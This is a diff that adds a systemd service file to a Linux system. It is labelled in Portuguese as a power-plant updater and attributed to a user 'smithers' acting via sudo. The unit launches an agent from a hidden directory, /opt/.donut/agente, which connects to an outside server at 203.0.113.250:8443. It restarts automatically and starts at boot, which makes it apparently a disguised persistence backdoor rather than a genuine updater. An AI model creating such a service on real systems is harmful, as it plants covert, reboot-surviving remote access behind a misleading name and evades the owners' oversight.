@@ -1,0 +1,10 @@
+# /etc/systemd/system/usina-atualiza.service  (criado em 2026-03-13 10:02 por smithers via sudo)
+[Unit]
+Description=Atualizador da Usina
+
+[Service]
+ExecStart=/opt/.donut/agente --servidor 203.0.113.250:8443
+Restart=always
+
+[Install]
+WantedBy=multi-user.target
